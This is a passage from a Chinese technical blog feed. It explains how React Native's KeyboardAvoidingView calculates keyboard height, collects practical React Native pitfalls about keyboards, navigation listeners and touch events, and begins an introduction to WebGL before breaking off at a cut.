class="name">View</span>&gt;</span></span></span><br><span class="line">      );</span><br><span class="line">    <span class="comment">// 如果没有传入 behavior 参数，那么就将其作为一个普通的 View 进行处理</span></span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">View</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">&#123;this.viewRef&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">onLayout</span>=<span class="string">&#123;this._onLayout&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">style</span>=<span class="string">&#123;style&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &#123;<span class="attr">...props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">      );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行不同组件的渲染时，其重点就是去根据键盘的高度，实时的去计算容器的高度（或者是边距，又或者时位置偏移量）。</p><p>以 <code>height</code> 模式为例，其容器的高度为 <code>this._initialFrameHeight - bottomHeight</code>。其中 <code>this._initialFrameHeight</code> 指的是初始状态下的容器高度，该值会在容器初次触发 <code>onLayout</code> 事件时被记录：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_onLayout = <span class="function">(<span class="params">event: ViewLayoutEvent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_frame</span> = event.<span class="property">nativeEvent</span>.<span class="property">layout</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">_initialFrameHeight</span>) &#123;</span><br><span class="line">    <span class="comment">// 记录键盘展开前，容器的初始高度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_initialFrameHeight</span> = <span class="variable language_">this</span>.<span class="property">_frame</span>.<span class="property">height</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">_updateBottomIfNecesarry</span>(); <span class="comment">// 重新计算 bottom 高度</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而 <code>bottomHeight</code> 就是键盘高度，该值对应组件 state 中的 <code>bottom</code>，在组件每次<strong>触发容器 <code>onLayout</code> 事件以及触发键盘事件</strong>时都会重新计算 <code>bottom</code> 的值：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_updateBottomIfNecesarry = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 如果键盘收起，那么 bottom 的值就为 0（键盘高度为 0）</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_keyboardEvent</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">bottom</span>: <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123;duration, easing, endCoordinates&#125; = <span class="variable language_">this</span>.<span class="property">_keyboardEvent</span>;</span><br><span class="line">  <span class="keyword">const</span> height = <span class="variable language_">this</span>.<span class="title function_">_relativeKeyboardHeight</span>(endCoordinates); <span class="comment">// 计算键盘的高度，将键盘当前的位置信息传入 ===&gt; 重点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">bottom</span> === height) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (duration &amp;&amp; easing) &#123;</span><br><span class="line">    <span class="title class_">LayoutAnimation</span>.<span class="title function_">configureNext</span>(&#123;</span><br><span class="line">      <span class="comment">// We have to pass the duration equal to minimal accepted duration defined here: RCTLayoutAnimation.m</span></span><br><span class="line">      <span class="attr">duration</span>: duration &gt; <span class="number">10</span> ? duration : <span class="number">10</span>,</span><br><span class="line">      <span class="attr">update</span>: &#123;</span><br><span class="line">        <span class="attr">duration</span>: duration &gt; <span class="number">10</span> ? duration : <span class="number">10</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="title class_">LayoutAnimation</span>.<span class="property">Types</span>[easing] || <span class="string">&#x27;keyboard&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">bottom</span>: height&#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>计算键盘的高度时需要去通过判断各个组件的位置才能准确得出。首先，我们在 <code>_updateBottomIfNecesarry</code> 中可以获取到键盘事件，从而得到键盘展开后距离屏幕顶端的距离（keyboardFrame.screenY）。然后我们可以通过获取当前容器距离屏幕顶部的距离（this._frame.y）以及当前容器的高度（this._frame.height），将其相加并于键盘距离屏幕顶部的高度相减，即可得出键盘的高度：</p><p><img src="https://i.loli.net/2020/10/15/MhSuEqmFc83yZLI.png" alt=""></p><p>这一操作在 <code>this._relativeKeyboardHeight</code> 实现：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">_relativeKeyboardHeight</span>(keyboardFrame): number &#123;</span><br><span class="line">  <span class="keyword">const</span> frame = <span class="variable language_">this</span>.<span class="property">_frame</span>; <span class="comment">// 在当状态下，容器的位置信息（此时容器的底部必定低于当前帧下键盘顶部之下）</span></span><br><span class="line">  <span class="keyword">if</span> (!frame || !keyboardFrame) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> keyboardY = keyboardFrame.<span class="property">screenY</span> - <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">keyboardVerticalOffset</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Calculate the displacement needed for the view such that it</span></span><br><span class="line">  <span class="comment">// no longer overlaps with the keyboard</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">max</span>(frame.<span class="property">y</span> + frame.<span class="property">height</span> - keyboardY, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，我们在计算 <code>keyboardY</code> 时减去了一个 <code>keyboardVerticalOffset</code>，该数值可以作为参数传入到 <code>&lt;Keyboardavoidingview /&gt;</code> 组件中，那么该数值究竟以为这什么？</p><p>在官方文档中解释到：这是用户屏幕顶部和react native视图之间的距离，在某些用例中可能不为零，默认为0。这句话很抽象，让我们具体到一个实例中来讲，我们想象这样一个布局结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">AppView</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 导航栏 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 内容区域 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ContentView</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Keyboardavoidingview</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextInput</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextInput</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextInput</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextInput</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Keyboardavoidingview</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ContentView</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">AppView</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的布局中，ContentView 为了保证内部元素的定位相时对于其本身的，因此其定位属性是 <strong>相对定位</strong>。此时，Keyboardavoidingview 组件内部计算自己的定位高度时（layout.y），计算的高度是从 ContentView 算起的，那么减去了键盘位置偏移量（keyboardFrame.screenY）后，就会发现减多了。为了避免这种情况，就加入了 <code>keyboardVerticalOffset</code> 属性来手动矫正偏移量：</p><p><img src="https://i.loli.net/2020/10/15/gM6ourBRFksbZp4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
            <tag> 源码解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReactNative踩坑之路</title>
      <link href="/2020/10/686927c477ef.html"/>
      <url>/2020/10/686927c477ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-ScrollView-中的-TextInput-阻止滑动操作"><a href="#1-ScrollView-中的-TextInput-阻止滑动操作" class="headerlink" title="1. ScrollView 中的 TextInput 阻止滑动操作"></a>1. ScrollView 中的 TextInput 阻止滑动操作</h2><p>当 TextInput 出现在 ScrollView 中时，同时设置 <code>textAlign: right</code> 的样式后，会出现如果点按到 TextInput 元素后再下滑，就会导致无法下滑。这一问题是 React 本身的 Bug 造成的，参考 issus: <a href="https://github.com/facebook/react-native/issues/12167">https://github.com/facebook/react-native/issues/12167</a></p><p>一个临时的解决方案是，为 TextInput 设置如下的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">multiline=&#123;true&#125;</span><br><span class="line">keyboardType=&#123;&quot;default&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="2-KeyboardAvoidingView-防止键盘遮挡"><a href="#2-KeyboardAvoidingView-防止键盘遮挡" class="headerlink" title="2. KeyboardAvoidingView 防止键盘遮挡"></a>2. KeyboardAvoidingView 防止键盘遮挡</h2><p><code>KeyboardAvoidingView</code> 用于防止键盘遮挡住用户的输入组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">KeyboardAvoidingView</span> behavior=<span class="string">&quot;height&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">KeyboardAvoidingView</span>&gt;</span><br></pre></td></tr></table></figure><p>当想要与 <code>ScrollView</code> 搭配使用，则可以直接嵌套入 <code>KeyboardAvoidingView</code> 中：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">KeyboardAvoidingView</span> behavior=<span class="string">&quot;height&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ScrollView</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">KeyboardAvoidingView</span>&gt;</span><br></pre></td></tr></table></figure><p>我们在表单中通常会有一个提交按钮，该按钮固定于屏幕下方，当键盘弹起时，该按钮也会出现，如果要想实现这样的布局：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">KeyboardAvoidingView</span> behavior=<span class="string">&quot;height&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ScrollView</span> <span class="attr">style</span>=<span class="string">&#123;&#123;marginBottom:</span> <span class="attr">100</span>&#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">SubmitButton</span> <span class="attr">style</span>=<span class="string">&#123;&#123;position:</span> &quot;<span class="attr">absolute</span>&quot;, <span class="attr">height:</span> <span class="attr">100</span>&#125;&#125;&gt;</span>提交<span class="tag">&lt;/<span class="name">SubmitButton</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">KeyboardAvoidingView</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="3-键盘展开时操作组件"><a href="#3-键盘展开时操作组件" class="headerlink" title="3. 键盘展开时操作组件"></a>3. 键盘展开时操作组件</h1><p>当在 ScrollView 中存在 TextInput 时，用户点击 TextInput 后会弹出键盘，此时当用户想要点击 ScrollView 中的其他<strong>可点击元素</strong>时，就会先缩回键盘，此时可点击元素身上所绑定的点击事件并未触发，当用户再次点击时才会触发。</p><p>然而在实际情况下，我们希望用户在键盘展开时点击其他可点击元素时，就直接触发该元素身上的点击事件。这时我们需要在 <code>&lt;ScrollView /&gt;</code> 组件上添加 <code>keyboardShouldPersistTaps</code> 属性，由官方文档可知，其有如下几个值：</p><ul><li>‘never’ （默认值），点击 TextInput 以外的子组件会使当前的软键盘收起。此时子元素不会收到点击事件。</li><li>‘always’，键盘不会自动收起，ScrollView 也不会捕捉点击事件，但子组件可以捕获。</li><li>‘handled’，当点击事件被子组件捕获时，键盘不会自动收起。这样切换 TextInput 时键盘可以保持状态。多数带有 TextInput 的情况下你应该选择此项。</li><li>false，已过时，请使用’never’代替。</li><li>true，已过时，请使用’always’代替。</li></ul><p><code>always</code> 与 <code>handled</code> 是比较难弄明白的，举个例子来说：</p><ul><li>当我们想要触发可点击元素身上的事件，同时保持当前聚焦的 <code>TextInput</code> 组件不失去焦点，那就使用 <code>always</code>。当我们触发点击事件后，不会失去焦点，同时键盘也不会缩回。</li><li>当我们想要触发可点击元素身上的事件，同时失去当前聚焦的 <code>TextInput</code> 的焦点，那就使用 <code>handled</code>。</li></ul><p><strong>需要特别注意的是</strong>，如果在 ScrollView 中嵌套 ScrollView，如果父级的 ScrollView 没有设置 <code>keyboardShouldPersistTaps</code> 属性，那么子级的 ScrollView 设置的 <code>keyboardShouldPersistTaps</code> 属性是无效的。</p><h1 id="4-奇葩的-Navigation-Listener"><a href="#4-奇葩的-Navigation-Listener" class="headerlink" title="4. 奇葩的 Navigation Listener"></a>4. 奇葩的 Navigation Listener</h1><p>在 Navigation 5 中使用 <code>addListener()</code> 方法添加导航监听，如果初次看官方文档可能会一脸懵比，因为没有提到如何移除时间监听。但是在官方示例中，我们可以看到一个细节，示例中使用了一个箭头函数，直接返回了 <code>addListener()</code> 方法的返回值，由此我们可以看出 <code>addListener()</code> 方法的返回值是一个函数，而且这个函数就是用来移除监听函数的。我们如果写的明白点就可以写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> removeListener = navigation.<span class="title function_">addListener</span>(<span class="string">&quot;beforeRemove&quot;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123; </span><br><span class="line">    <span class="title function_">removeListener</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure><p>还有一个坑，假设一个场景，通过事件监听拦截返回动作，让返回上层的默认动作改为返回到路由界面顶层，那么我们可能会这么写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> removeListener = navigation.<span class="title function_">addListener</span>(<span class="string">&quot;beforeRemove&quot;</span>, <span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    navigation.<span class="title function_">popToTop</span>(); <span class="comment">// 退回到顶层路由</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> removeListener;</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure><p>然后当我们返回后，就会 Boom ！出现堆栈溢出的警告。</p><p>这是因为在执行 <code>popToTop()</code> 时，必定会再次触发组件的 <code>beforeRemove</code> 事件，然后再触发监听，导致再次执行 <code>popToTop()</code>，然后触发监听事件 … … 这样就陷入了一个死循环，堆栈自然会溢出。于此相类似的，只要我们想返回之前的任一页面，就都会触发 <code>beforeRemove</code> 事件，然后陷入到如此的死循环。但是如果我们前往一个新的页面，就不会触发 <code>beforeRemove</code> 事件，也就能正常跳转了。</p><p>那解决方案也很简单，在执行 <code>popToTop()</code> 方法前，移除掉路由的监听：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  useEffect(() =&gt; &#123;</span><br><span class="line">    const removeListener = navigation.addListener(&quot;beforeRemove&quot;, (e)=&gt;&#123;</span><br><span class="line"><span class="addition">+     removeListener();</span></span><br><span class="line">      e.preventDefault();</span><br><span class="line">      navigation.popToTop(); // 退回到顶层路由</span><br><span class="line">    &#125;);</span><br><span class="line">    return removeListener;</span><br><span class="line">  &#125;, [])</span><br></pre></td></tr></table></figure><blockquote><p>PS: 官方使用了 <code>navigation.dispatch(e.data.action)</code> 来正常使页面进行了 goBack 操作并没有触发 <code>beforeRemove</code>，这一点让我很迷。因为 <code>e.data.action</code> 实际上就是 <code>&#123;type: &quot;GO_BACK&quot;&#125;</code> 而使用 <code>dispatch</code> 派发这个动作必定会触发 <code>beforeRemove</code>，不知道为什 <code>navigation.dispatch(e.data.action)</code> 可行，而 <code>navigation.dispatch(&#123;type: &quot;GO_BACK&quot;&#125;)</code> 不行</p></blockquote><h1 id="5-阻止事件冒泡"><a href="#5-阻止事件冒泡" class="headerlink" title="5. 阻止事件冒泡"></a>5. 阻止事件冒泡</h1><p>React Native 的事件系统与 Web 是有些不一样的。</p><p>以触摸事件举例，当父元素绑定了触摸事件，会出现以下的情况：</p><ul><li>当子元素上没有任何 Touchable 组件，会触发父元素的事件</li><li>当子元素有 Touchable 组件，那么只会触发当前子元素的点击事件，不会触发父元素的事件</li></ul><p>因此可得 React Native 默认是阻止事件冒泡的，但是总感觉阻止冒泡的方式很奇怪，而且如果阻止了点击事件，子元素的滑动事件也无效了（比如在子元素中加入一个 ScrollView，那么 ScrollView 是无法滑动的）。</p><p>那么有没有一个方法可以显示指定不触发父元素的事件呢，经过对 react-native-elements <code>Overlay</code> 组件的学习，发现 View 上有一个 <a href="https://reactnative.cn/docs/view#pointerevents">pointerEvents</a> 属性。</p><p>如果子元素想阻止父元素的点击事件，只需要在子元素上添加 <code>pointerEvents=&quot;box-none&quot;</code> 即可</p><h1 id="6-什么时候该收起键盘？"><a href="#6-什么时候该收起键盘？" class="headerlink" title="6. 什么时候该收起键盘？"></a>6. 什么时候该收起键盘？</h1><p>这个问题在表单场景下时会经常遇到，我们会纠结于到底如何控制键盘的收起于展开，首先我们来看下 ReactNative 中对键盘收起于展开的默认行为预设：</p><ul><li>在 View 中，如果存在 <code>TextInput</code> 组件与 <code>Button</code> 组件：<ul><li>点击视图空白区域，键盘不会收起</li><li>点击按钮，按钮事件正常触发，键盘不会收起</li></ul></li><li>在 ScrollView 中，如果存在 <code>TextInput</code> 组件与 <code>Button</code> 组件：<ul><li>点击视图空白区域，键盘收起</li><li>点击按钮，按钮事件<strong>不触发</strong>，键盘收起，再次点击按钮，按钮事件触发（第一次点击触发键盘收起操作，第二次点击触发按钮事件）</li><li>滑动视图，键盘不会收起</li></ul></li></ul><p>在 View 组件中，我们无法控制默认的键盘收起行为，除非使用 Keyboard 相关方法强制键盘收起。</p><p>在 ScrollView 组件中，组件提供了 <code>keyboardShouldPersistTaps</code> 属性可以让开发者来控制键盘收起与展开的行为，其可以设置三个值，分别为：</p><ol><li>‘never’ （默认值），点击 TextInput 以外的子组件会使当前的软键盘收起。此时子元素不会收到点击事件。</li><li>‘always’，键盘不会自动收起，ScrollView 也不会捕捉点击事件，但子组件可以捕获。</li><li>‘handled’，当点击事件被子组件捕获时，键盘不会自动收起。这样切换 TextInput 时键盘可以保持状态。多数带有 TextInput 的情况下你应该选择此项。</li></ol><p>在表单场景下，并不推荐默认的 <code>never</code>，因为这样会让用户点击两次目标元素才能触发该元素上绑定的事件。</p><p>仍以上面的场景来举例，在 ScrollView 中，如果存在 <code>TextInput</code> 组件与 <code>Button</code> 组件：</p><ul><li>当我们把 <code>keyboardShouldPersistTaps</code> 设置为 <code>always</code> 时：<ul><li>点击视图空白区域，键盘不收起</li><li>点击按钮，按钮事件正常触发，键盘不会收起</li></ul></li><li>当我们把 <code>keyboardShouldPersistTaps</code> 设置为 <code>handle</code> 时：<ul><li>点击视图空白区域，键盘收起</li><li>点击按钮，按钮事件正常触发，键盘不会收起</li></ul></li></ul><p>因此，如果在表单场景下，会有很多 TextInput 框与按钮，因该将该值设置为 <code>handle</code> 来优化交互体验。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从WebGL谈起到react-three-fiber</title>
      <link href="/2020/08/0489c11b06ab.html"/>
      <url>/2020/08/0489c11b06ab.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-WebGL"><a href="#1-WebGL" class="headerlink" title="1. WebGL"></a>1. WebGL</h1><h2 id="1-1-何为-WebGL"><a href="#1-1-何为-WebGL" class="headerlink" title="1.1 何为 WebGL"></a>1.1 何为 WebGL</h2><p>在探讨什么是 WebGL 之前我们需要先来了解一下 OpenGL。</p><p>在早期的计算机上，绘制 3D 图像需要单独针对与一种硬件与一种操作系统进行“定制化”的编程，然而这样的开发成本无疑是巨大的。因此出于减少开发成本，关爱程序员发际线的人道主义精神，OpenGL 诞生了。OpenGL 被定义为是一个用于渲染2D或者3D矢量图形的跨语言、跨平台的应用程序编程接口，对于 OpenGL 硬件层面的具体实现都交给了显卡的生产厂商，而开发者就只需要使用 OpenGL 的 API 就可以实现各种各样的图形操作了。</p><blockquote><p>Tips：跟 OpenGL 同级下可对比的还有很多人所熟知的微软 DirectX 开发套件。此外，各家用游戏主机平台也有其对应的图形 API，这些规范比 OpenGL 的出现要更早。</p></blockquote><p>回归 WebGL，WebGL 就是 OpenGL 在互联网浏览器端的一种实现。更具体的来说，WebGL 是基于 OpenGL ES 的，其语法之间有相似与关联性，而 OpenGL ES 又是 OpenGL 在嵌入式以及移动端的改良优化版本，其属于 WebGL 规范的子集，简化了部分 API，其具体的关系详情可以参考下图：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190820205613.png" alt="20190820205613.png"></p><p>WebGL 已经完全集成到浏览器的所有网页标准中，可将影像处理和效果的 GPU 加速使用方式当做网页 Canvas 的一部分，因此 WebGL 元素可以加入其他 HTML 元素之中并与网页或网页背景的其他部分混合。</p><p>在编程风格上，WebGL 程序由 <strong>JavaScript 编写的句柄</strong> 和 <strong>OpenGL Shading Language（GLSL）编写的着色器代码</strong> 组成（没错，是由两种语言构成）。GLSL 类似于 C 语言的风格，但其本身并非 C 语言，其可以在计算机的图形处理器（GPU）上运行。</p><blockquote><p>Tips: 在早期 GPU 尚未出现的时候 CPU 需要负责图形运算。但是随着图像处理技术的发展，3D 图形的计算量变得逐渐庞大，图形加速卡、显卡便应运而生。那些重复的图形运算工作都可以由 GPU 来进行运算了，而 CPU 就可以用来处理其他更加复杂且多元的任务，这就是 GLSL 为什么运行在 GPU 而非 CPU 的原因。</p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20190820204937.png" alt="20190820204937.png"></p><h2 id="1-2-WebGL-核心概念"><a href="#1-2-WebGL-核心概念" class="headerlink" title="1.2 WebGL 核心概念"></a>1.2 WebGL 核心概念</h2><p>在 WebGL 的使用过程中，会牵涉到大量计算机图形学的相关概念，这些概念往往比较难懂，如果在刚开始没有办法理解，那么可以在后续的代码实现过程中，再回头来梳理这些概念。</p><h3 id="1-2-1-着色器"><a href="#1-2-1-着色器" class="headerlink" title="1.2.1 着色器"></a>1.2.1 着色器</h3><p>在 OpenGL ES 2.0 中可以使用着色器编程，意味着可以调用显卡并行运算的能力，来进行业务中需要的开发。</p><p>着色器是使用我们上面所提及的 GLSL 语言所编写的程序，它携带着绘制形状的顶点信息以及构造绘制在屏幕上像素的所需数据，换句话说，它负责记录着像素点的位置和颜色。</p><p>着色器又分为 <strong>顶点着色器（VertexShader）</strong> 和 <strong>片段着色器（FragmentShader）</strong>，它们是两种不同的着色器函数，在开发者使用 GLSL 编写完着色器后，需要将其传递给 WebGL，使之在GPU执行时编译。</p><p>顶点着色器的作用是计算顶点的位置。根据计算出的一系列顶点位置，WebGL 可以对点、线和三角形在内的一些图元进行 <strong>光栅化</strong> 处理。当对这些图元进行光栅化处理时需要使用片段着色器方法。片段着色器的作用是计算出当前绘制图元中每个像素的颜色值。</p><blockquote><p>Tips：光栅化是指将构成图形的一系列的点进行上色，这是一个很重要的概念。</p></blockquote><h3 id="1-2-2-渲染管线"><a href="#1-2-2-渲染管线" class="headerlink" title="1.2.2 渲染管线"></a>1.2.2 渲染管线</h3><p>要在 WebGL 中绘制 3D 图形，需要经历一系列的过程，这一过程被称之为渲染管线，具体流程有如下几步：</p><ul><li>初始化WebGL − JavaScript是用于初始化WebGL的上下文。</li><li>创建数组 − 我们创建JavaScript数组来保存几何数据。</li><li>缓冲区对象 − 通过将数组作为参数来创建缓冲区对象(顶点和索引)。</li><li>着色器 − 我们创建，编译和使用JavaScript链接着色器。</li><li>属性− 我们可以创建属性，启用它们并使用JavaScript缓冲区对象相关联。</li><li>制服− 我们还可以使用 JavaScript 制服(uniforms)关联。</li><li>变换矩阵 − 使用JavaScript，我们可以创建变换矩阵。</li></ul><p>WebGL 渲染管线在 WebGL Api 下的执行过程如下图所示：</p><blockquote><p> 其中重要的操作就是通过 <strong>透视除法（由WebGL底层实现）</strong> 将 <strong>裁剪坐标系</strong> 转化为 <strong>规范化的设别坐标系</strong> 中 </p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20190820212148.png" alt="20190820212148.png"></p><h3 id="1-2-3-缓冲区"><a href="#1-2-3-缓冲区" class="headerlink" title="1.2.3 缓冲区"></a>1.2.3 缓冲区</h3><p>buffer 是一个重要的概念，开发者在 js 中定义的坐标不能够直接使用，必须将原数据绑定到一个顶点着色器 